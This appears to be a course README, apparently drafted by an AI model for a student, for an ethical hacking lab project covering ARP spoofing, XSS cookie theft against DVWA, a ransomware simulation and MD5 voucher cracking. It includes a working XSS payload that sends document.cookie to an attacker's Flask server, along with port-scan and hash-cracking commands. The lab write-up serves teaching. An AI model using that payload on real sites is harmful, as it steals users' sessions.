```markdown
# CSCI369 Ethical Hacking – Project Submission

## Overview
This project demonstrates practical exploitation of common network, web, and cryptographic vulnerabilities. All tasks were performed in an isolated virtual lab environment with **Kali Linux** (attacker), **Metasploitable2** (victim), and **Ubuntu** (server). The four tasks include:

1. ARP spoofing (MITM attack) using Scapy  
2. Cookie stealing via reflected XSS on DVWA  
3. Ransomware simulation with hybrid encryption (AES + RSA)  
4. Gift voucher code cracking (CTF) using MD5 hash cracking

---

## Task 1: ARP Spoofer (`Q1/`)

### Description
A Python script using `scapy` to perform ARP spoofing between a victim (Metasploitable2) and the router, redirecting traffic through the attacker (Kali). The script restores original ARP tables on exit.

### Requirements
- Kali Linux VM (attacker)
- Metasploitable2 VM (victim)
- Python 3 + `scapy` (`pip install scapy`)
- Run as root: `sudo python3 arpspoof.py`

### Usage
```bash
sudo python3 arpspoof.py <Victim_IP> <Router_IP>
```

### Key Functions
- `get_mac(ip)`: sends ARP request to get MAC address.
- `spoof_arp(target_ip, spoof_ip, target_mac)`: sends forged ARP reply.
- `restore_arp()`: restores ARP tables on `Ctrl+C`.

### Outcome
- Victim’s ARP cache shows router’s IP mapped to attacker’s MAC.
- Traffic successfully redirected; ARP tables restored after interruption.

---

## Task 2: Cookie Stealer via XSS (`Q2/`)

### Description
Exploits a reflected XSS vulnerability in DVWA (Metasploitable2) to steal the victim’s session cookie. A Flask server on Kali receives the cookie and logs it with a timestamp.

### Requirements
- Kali Linux VM (attacker)
- Metasploitable2 VM with DVWA (security set to **medium**)
- Python 3.12+ and Flask

### Setup & Run

#### 1. Start Flask server on Kali
```bash
python3 cookie-stealer.py
```
Server listens on `0.0.0.0:5000`. Endpoint `/steal` saves the cookie to `cookies.txt`.

#### 2. Inject XSS payload into DVWA reflected XSS field
```javascript
<script>
document.location='http://192.168.64.2:5000/steal?cookie='+document.cookie;
</script>
```

### Outcome
- Each time the poisoned page is loaded, the cookie is sent to the attacker.
- `cookies.txt` logs entries like:
  ```
  [2025-08-05 13:04:24] Stolen cookie: security=low; PHPSESSID=...
  ```

---

## Task 3: Ransomware Simulation (`Q3/`)

### Description
A Python script that simulates ransomware by:
1. Generating a 128‑bit AES key using `openssl rand -base64 16`.
2. Generating an RSA key pair (attacker’s public key).
3. Encrypting `my_secrets.txt` with AES‑128‑CBC → `data_cipher.txt` (base64).
4. Encrypting the AES key with the RSA public key → `key_cipher.txt` (base64).
5. Deleting `key.txt` and `my_secrets.txt`.
6. Displaying a ransom note.

### Requirements
- Kali Linux VM (or any Linux with OpenSSL)
- Python 3 + `cryptography` library
- A test file `my_secrets.txt` in the same directory

### Usage
```bash
# Create a test file
echo "This is a secret" > my_secrets.txt

# Run the ransomware
python3 ransomware.py
```

### Outcome
- Original `my_secrets.txt` deleted.
- `data_cipher.txt` (encrypted file content) and `key_cipher.txt` (encrypted symmetric key) created.
- Ransom message printed.

---

## Task 4: Gift Voucher Code Cracking – CTF (`Q4/`)

### Description
A capture‑the‑flag challenge where a UDP server generates MD5 hashes as gift voucher codes using the formula:  
`VoucherCode = MD5(A || ClientID || B)`  
- `A` = two lowercase letters (aa … zz)  
- `B` = two symbols from a set (e.g., `##`, `^@`, … `^&`)  
- `ClientID` = 7‑digit student ID (1035289)

### Steps & Results

#### a) Port Scanning
```bash
nmap -sU -p 12345-12500 localhost
```
**Open port:** `12463`

#### b) Retrieve Voucher Code
```bash
echo "1035289" | nc -u localhost 12463
```
**Voucher code:** `830f281af49c89de4be6874ebba738f6`

#### c) Crack the Hash
- Generate `A` combinations:  
  `crunch 2 2 abcdefghijklmnopqrstuvwxyz -o A_list.txt`
- Generate `B` combinations:  
  `crunch 2 2 '!@#$%^&*()_+-=[]{};:'"'"',./<>?' -o B_list.txt`
- Build candidate list `combined.txt` by concatenating `A + 1035289 + B` for all pairs.
- Run Hashcat:
  ```bash
  hashcat -m 0 target_vouchercode.txt combined.txt --force
  ```
**Cracked value:** `yl1035289/<`  
**Verification:** `echo -n "yl1035289/<" | md5sum` → matches `830f281af49c89de4be6874ebba738f6`

Thus, the server used `A = "yl"` and `B = "/<"`.

---

## Environment & Virtual Machines

- **VirtualBox / UTM** with three VMs:
  - **Kali Linux** – attacker (tasks 1,2,3)
  - **Metasploitable2** – victim (tasks 1,2,3)
  - **Ubuntu** – server for task 4
- Network: Host‑only or NAT – ensure all VMs can communicate.

---

## Submission Structure

Each task folder (`Q1/`, `Q2/`, `Q3/`, `Q4/`) contains:
- Python source code (`.py`)
- `README.md` with execution instructions
- Supporting files (e.g., `xss_payload.txt`, `cookies.txt`, screenshots)
- `Q4_answers.docx` for the CTF report

All folders compressed into a single ZIP file named with the student ID (`1035289.zip`).

---

## Tools & Libraries Used

| Task | Tools / Libraries |
|------|-------------------|
| Q1   | Python, scapy, sys, signal |
| Q2   | Python, Flask, datetime |
| Q3   | Python, cryptography, subprocess, os, base64 |
| Q4   | nmap, netcat, crunch, hashcat, md5sum |

---

## Ethical Note

This project was completed as part of an accredited ethical hacking course (CSCI369) in a controlled, isolated lab environment. All techniques are for educational purposes only and must not be used against any system without explicit permission.
---
**Course:** CSCI369 – Ethical Hacking (S3 2025)  
**Date:** August 2025
```

You can copy this directly into a `README.md` file. It follows the same style as your previous README examples (headings, code blocks, lists, and clear separation of tasks). Let me know if you need any changes.
